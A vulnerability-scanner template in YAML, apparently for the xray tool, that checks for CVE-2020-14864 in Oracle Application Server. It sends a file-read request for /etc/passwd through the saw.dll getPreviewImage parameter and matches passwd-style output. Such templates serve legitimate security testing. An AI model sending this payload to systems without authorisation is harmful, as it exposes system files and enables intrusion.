name: poc-yaml-oracle-application-server-cve-2020-14864-fileread
binding: 11a87d02-3bc9-4b94-a4ad-bc83ff8b28c4
manual: true
detail:
    author: y0y0
    links:
        - https://github.com/osamatest1/twitter.com-15203/blob/f5de5fb80be1502d9c589015e95ea405232186a4/nuclei-templates/cves/2020/CVE-2020-14864.yaml
        - https://fofa.info/result?qbase64=Ik9yYWNsZS1BcHBsaWNhdGlvbi1TZXJ2ZXIi
    vulnerability:
        level: high
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /analytics/saw.dll?getPreviewImage&previewFilePath=/etc/passwd
            follow_redirects: false
        expression: response.status == 200 && response.content_type.contains("text/plain") && "root:.*?:[0-9]*:[0-9]*:".matches(response.body_string)
expression: r0()
